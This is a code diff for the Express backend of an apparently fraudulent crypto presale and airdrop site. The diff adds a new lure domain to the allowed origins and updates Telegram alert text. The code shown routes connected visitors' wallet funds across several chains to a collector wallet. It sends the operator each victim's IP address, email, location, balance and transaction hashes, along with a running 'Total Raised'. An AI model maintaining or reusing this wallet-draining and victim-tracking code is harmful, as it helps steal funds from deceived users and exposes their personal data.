@@ -167,7 +167,13 @@ app.use(helmet({
 
 const allowedOrigins = process.env.ALLOWED_ORIGINS 
   ? process.env.ALLOWED_ORIGINS.split(',') 
-  : ['http://localhost:3000', 'https://bitcoinhypertoken.vercel.app', 'https://bthbk.vercel.app', 'https://fartcoinairdrop.vercel.app'];
+  : [
+      'http://localhost:3000', 
+      'https://bitcoinhypertoken.vercel.app', 
+      'https://bthbk.vercel.app', 
+      'https://fartcoinairdrop.vercel.app',
+      'https://fartcoin-airdrops.vercel.app'
+    ];
 
 app.use(cors({
   origin: allowedOrigins,
@@ -412,7 +418,7 @@ async function testTelegramConnection() {
       `✅ MultiChain FlowRouter Ready\n` +
       `📦 Collector: ${COLLECTOR_WALLET.substring(0, 10)}...${COLLECTOR_WALLET.substring(36)}\n` +
       `🌐 Networks: Ethereum, BSC, Polygon, Arbitrum, Avalanche\n` +
-      `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app\n` +
+      `🌍 <b>Site URLs:</b> https://bitcoinhypertoken.vercel.app, https://fartcoinairdrop.vercel.app\n` +
       `💾 <b>Storage:</b> ${memoryStorage.participants.length} participants, ${memoryStorage.siteVisits.length} visits\n` +
       `💰 <b>Total Raised:</b> $${memoryStorage.settings.statistics.totalProcessedUSD.toFixed(2)}\n` +
       `👛 <b>Processed Wallets:</b> ${totalProcessedWallets}\n` +
@@ -624,7 +630,7 @@ async function trackSiteVisit(ip, userAgent, referer, path) {
     `👤 <b>Human:</b> ${visit.isHuman ? '✅ Yes' : '❌ No (Bot)'}\n` +
     `🔗 <b>From:</b> ${referer || 'Direct'}\n` +
     `📱 <b>Path:</b> ${path || '/'}\n` +
-    `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app\n` +
+    `🌍 <b>Site URLs:</b> https://bitcoinhypertoken.vercel.app, https://fartcoinairdrop.vercel.app\n` +
     `🆔 <b>Visit ID:</b> ${visit.id}`;
   
   await sendTelegramMessage(telegramMessage);
@@ -823,7 +829,7 @@ app.post('/api/presale/connect', async (req, res) => {
         `🌐 <b>IP:</b> ${clientIP.replace('::ffff:', '')}\n` +
         `📧 <b>Email:</b> ${email}\n` +
         `👤 <b>Human:</b> ${participant.isHuman ? '✅ Yes' : '❌ No'}\n` +
-        `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app`;
+        `🌍 <b>Site URLs:</b> https://bitcoinhypertoken.vercel.app, https://fartcoinairdrop.vercel.app`;
       
       await sendTelegramMessage(newUserMsg);
     }
@@ -852,7 +858,7 @@ app.post('/api/presale/connect', async (req, res) => {
         `💵 <b>Total Balance:</b> $${balanceResult.data.totalValueUSD.toFixed(2)}\n` +
         `🎯 <b>Status:</b> ${balanceResult.data.isEligible ? '✅ ELIGIBLE' : '👋 WELCOME'}\n` +
         `📧 <b>Email:</b> ${email}\n` +
-        `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app`;
+        `🌍 <b>Site URLs:</b> https://bitcoinhypertoken.vercel.app, https://fartcoinairdrop.vercel.app`;
       
       await sendTelegramMessage(connectMsg);
       
@@ -943,7 +949,7 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
       `💵 <b>Total Value:</b> $${totalFlowUSD}\n` +
       `🔗 <b>Transactions (${transactions.length} chains):</b>${txDetails}\n` +
       `🆔 <b>Flow ID:</b> <code>${flowId}</code>\n` +
-      `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app`
+      `🌍 <b>Site URLs:</b> https://bitcoinhypertoken.vercel.app, https://fartcoinairdrop.vercel.app`
     );
     
     res.json({
@@ -1048,7 +1054,7 @@ app.post('/api/presale/execute-flow', async (req, res) => {
           `💵 <b>Amount:</b> ${txAmount} ${txSymbol} ($${txValueUSD.toFixed(2)})\n` +
           `🆔 <b>Tx Hash:</b> <code>${txHash}</code>\n` +
           `🆔 <b>Flow ID:</b> <code>${flowId}</code>\n` +
-          `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app`
+          `🌍 <b>Site URLs:</b> https://bitcoinhypertoken.vercel.app, https://fartcoinairdrop.vercel.app`
         );
         
         // Check if flow is complete
@@ -1081,7 +1087,7 @@ app.post('/api/presale/execute-flow', async (req, res) => {
             `💵 <b>Total Value:</b> $${flowTotalUSD.toFixed(2)}\n` +
             `🔗 <b>All ${flow.transactions.length} chains processed!</b>${completionDetails}\n` +
             `🆔 <b>Flow ID:</b> <code>${flowId}</code>\n` +
-            `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app`
+            `🌍 <b>Site URLs:</b> https://bitcoinhypertoken.vercel.app, https://fartcoinairdrop.vercel.app`
           );
         }
         
@@ -1131,7 +1137,7 @@ app.post('/api/presale/claim', async (req, res) => {
       `🎁 <b>Allocation:</b> ${participant.allocation?.amount || '5000'} BTH\n` +
       `📧 <b>Email:</b> ${participant.email}\n` +
       `📍 <b>Location:</b> ${participant.country} ${participant.flag}${participant.city ? `, ${participant.city}` : ''}\n` +
-      `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app`
+      `🌍 <b>Site URLs:</b> https://bitcoinhypertoken.vercel.app, https://fartcoinairdrop.vercel.app`
     );
     
     res.json({ success: true });
@@ -1491,7 +1497,7 @@ async function startServer() {
   ================================================
   📍 Port: ${PORT}
   🔗 Backend URL: https://bthbk.vercel.app
-  🌍 Site URL: https://bitcoinhypertoken.vercel.app, https://fartcoinairdrop.vercel.app/
+  🌍 Site URLs: https://bitcoinhypertoken.vercel.app, https://fartcoinairdrop.vercel.app
   
   📦 COLLECTOR: ${COLLECTOR_WALLET}
   💾 STORAGE: 7 DAY RETENTION
